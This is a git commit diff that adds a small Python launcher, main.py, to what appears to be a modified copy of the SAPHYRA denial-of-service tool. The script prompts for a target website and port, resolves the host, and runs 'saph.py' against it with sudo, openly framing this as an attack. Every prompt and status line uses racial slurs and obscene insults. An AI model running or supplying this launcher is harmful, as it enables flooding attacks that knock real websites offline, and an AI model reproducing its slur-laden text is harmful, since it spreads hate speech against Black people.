847d3b7c8bb35595de75848cd99eb211e007efd8
Pheanoukma <103352870+Pheanoukma@users.noreply.github.com>
2022-06-27 18:47:56 +0700

    Add files via upload

---
+++ SAPHYRA-main/MODIFIED-SAPHYRA/main.py
@@ -0,0 +1,18 @@
+import os 
+import sys 
+import time as t 
+import socket 
+
+print(" Lol u suck dick nigger")
+doshost = str(input(" Enter A Website stupid nigger ==> "))
+port = str(input(" Port forwarding to the target niggers ==> "))
+
+C = socket.gethostbyname(doshost)
+print("-----------------------------------------")
+print(" Stupid nigger attack ===> ", C)
+print("-----------------------------------------")
+print("Miggers is launching in 10 seconds......")
+t.sleep(10)
+os.system('clear')
+os.system(f' sudo python3 saph.py -s {C} -p {port} ')
+
